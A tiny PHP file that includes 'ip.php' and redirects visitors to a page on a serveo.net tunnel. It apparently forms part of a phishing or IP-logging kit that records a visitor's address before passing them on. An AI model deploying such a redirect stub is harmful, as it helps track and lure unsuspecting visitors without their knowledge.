<?php
include 'ip.php';
header('Location: https://velle.serveo.net/index2.html');
exit
?>
